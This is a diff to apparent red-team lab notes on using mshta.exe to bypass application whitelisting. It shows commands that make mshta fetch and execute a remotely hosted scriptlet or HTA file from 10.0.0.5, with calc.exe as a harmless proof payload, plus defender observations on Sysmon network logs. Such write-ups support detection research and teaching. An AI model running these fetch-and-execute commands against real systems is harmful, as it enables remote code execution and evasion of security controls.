@@ -6,6 +6,8 @@ description: MSHTA code execution - bypass application whitelisting.
 
 ## Execution
 
+Writing a scriptlet file that will launch calc.exe when invoked:
+
 {% code-tabs %}
 {% code-tabs-item title="http://10.0.0.5/m.sct" %}
 ```markup
@@ -29,9 +31,11 @@ description: MSHTA code execution - bypass application whitelisting.
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+Invoking the scriptlet file hosted remotely:
+
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
-```bash
+```csharp
 # from powershell
 /cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
 ```
@@ -40,11 +44,11 @@ description: MSHTA code execution - bypass application whitelisting.
 
 ## Observations
 
-As expected, calc is spawned by mshta. Also, mhsta and cmd exit almost immediately after invoking the calc.exe.
+As expected, calc.exe is spawned by mshta.exe. Worth noting that mhsta and cmd exit almost immediately after invoking the calc.exe:
 
 ![](../.gitbook/assets/mshta-calc.png)
 
-Look at sysmon for mshta establishing network connections:
+As a defender, look at sysmon logs for mshta establishing network connections:
 
 ![](../.gitbook/assets/mshta-connection.png)
 
@@ -56,7 +60,7 @@ Also, suspicious commandlines:
 
 The hta file can be invoked like so:
 
-```bash
+```csharp
 mshta.exe http://10.0.0.5/m.hta
 ```
 
